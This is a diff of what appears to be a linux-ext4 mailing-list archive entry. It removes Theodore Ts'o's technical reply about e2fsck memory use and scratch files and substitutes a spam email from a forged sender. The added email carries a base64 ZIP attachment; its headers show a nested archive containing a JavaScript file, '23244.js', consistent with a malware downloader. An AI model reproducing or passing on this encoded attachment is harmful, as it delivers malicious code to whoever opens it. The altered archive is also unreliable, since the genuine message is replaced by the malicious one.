@@ -1,98 +1,74 @@
-From: Theodore Ts'o <tytso@mit.edu>
-Subject: Re: ext4 scaling limits ?
-Date: Wed, 22 Mar 2017 23:35:10 -0400
-Message-ID: <20170323033510.tx62b4y5ap3jkrnt@thunk.org>
-References: <CAE0An6fc6tX6ACQYdTYdP+CwN=RDKuv_oaW0xeNrBLY_1AvOtw@mail.gmail.com>
- <32A4A230-566F-4476-A516-2C6C4BA5C1C6@dilger.ca>
+From: <bfoster@uca.edu>
+Subject: 50072 linux-ext4
+Date: Thu, 23 Mar 2017 19:29:46 -0000
+Message-ID: <149029738695.14703.7061117641884316938@permonline.ru>
+Reply-To: <bfoster@uca.edu>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: Manish Katiyar <mkatiyar@gmail.com>, linux-ext4@vger.kernel.org
-To: Andreas Dilger <adilger@dilger.ca>
+Content-Type: application/zip; name="58182.zip"
+Content-Transfer-Encoding: base64
+To: "linux-ext4" <linux-ext4@vger.kernel.org>
 Return-path: <linux-ext4-owner@vger.kernel.org>
-Received: from imap.thunk.org ([74.207.234.97]:40594 "EHLO imap.thunk.org"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1751503AbdCWDfN (ORCPT <rfc822;linux-ext4@vger.kernel.org>);
-        Wed, 22 Mar 2017 23:35:13 -0400
-Content-Disposition: inline
-In-Reply-To: <32A4A230-566F-4476-A516-2C6C4BA5C1C6@dilger.ca>
+Received: from 90.150.126.177.permonline.ru ([90.150.126.177]:33115 "HELO
+        permonline.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1755614AbdCWT3x (ORCPT
+        <rfc822;linux-ext4@vger.kernel.org>); Thu, 23 Mar 2017 15:29:53 -0400
+Content-Disposition: attachment
 Sender: linux-ext4-owner@vger.kernel.org
 List-ID: <linux-ext4.vger.kernel.org>
 
-On Tue, Mar 21, 2017 at 05:48:11PM -0400, Andreas Dilger wrote:
-> While it is true that e2fsck does not free memory during operation, in
-> practice this is not a problem. Even for large filesystems (say 32-48TB)
-> it will only use around 8-12GB of RAM so that is very reasonable for a
-> server today.
-
-E2fsck does free memory during operation; see the comments in front of
-pass 2 and pass 3 for example:
-
- * Pass 2 also collects the following information:
- * 	- The inode numbers of the subdirectories for each directory.
- *
- * Pass 2 relies on the following information from previous passes:
- * 	- The directory information collected in pass 1.
- * 	- The inode_used_map bitmap
- * 	- The inode_bad_map bitmap
- * 	- The inode_dir_map bitmap
- *
- * Pass 2 frees the following data structures
- * 	- The inode_bad_map bitmap
- * 	- The inode_reg_map bitmap
-
- * Pass 3 frees the following data structures:
- *     	- The dirinfo directory information cache.
-
-It's not a *lot* of memory, especially given that bitmaps are stored
-in a much more compact, extent-mapped format, but it does free some
-memory.
-
-It is fair to say that e2fsck is optimized to run as quickly as
-possible, and to cache information so that we are not rereading file
-system metadata from disk.  This was done using some of the
-suggestions from the 1989 Usenix ATC paper:
-
-Bina. E. J., and P. A. Emrath (1989): "A faster fsck for BSD UNIX,"
-Proceedings of the Winter 1989 USENIX Technical Conference, 173-185.
-
-
-On Tue, 21 Mar 2017 22:59:18 +0100 Reindl Harald <h.reindl@thelounge.net> said:
->Am 21.03.2017 um 22:48 schrieb Andreas Dilger:
->> While it is true that e2fsck does not free memory during operation, in
->> practice this is not a problem. Even for large filesystems (say 32-48TB)
->> it will only use around 8-12GB of RAM so that is very reasonable for a
->> server today.
->
->no it's not reasonable even today that your whole physical machine exposes
->it's total RAM to the one of many single virtual machines running just a samba
->server for a 50 TB "datagrave" with a handful of users
->
->in reality it should not be a problem to attach even a 100 TB storage to a VM
->with 1-2 GB
-
-Reindl, sorry, but today, if you have an out-of-balance server with a
-huge amoutn of storage, and a tiny amount of disk, it *will* be a
-problem.
-
-If you are desperate, you *may* be able to use the scratch files
-feature documented in e2fsck.conf.  This was mainly implemented for
-users of desktop NAS boxes which tried to connect a huge disk to a
-tiny arm server, and the manufacturers of said NAS boxes didn't bother
-to check to see if they had provisioned enough memory so they could
-repair a broken file system.  (I know they didn't because the
-developers didn't reach out to me; their users did.)  The scratch
-files is way to use on-disk databases to replace the in-memory data
-structure, but it is S-L-O-W.  But hey, you get what you pay for, and
-if you are too cheapskate to provision a system with enough memory,
-you (or your paying customers) will suffer the consequences.
-
-If you don't like this answer, feel free to write your own e2fsck
-which is 5-6 times slower because it is constantly rereading metadata
-from disk.
-
-Or submit patches, but if it slows down the fsck times on a reasonably
-configured servers, I reserve the right to reject such patches as
-inflicting pain existing users of ext4 who correctly sized their
-servers.
-
-						- Ted
+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
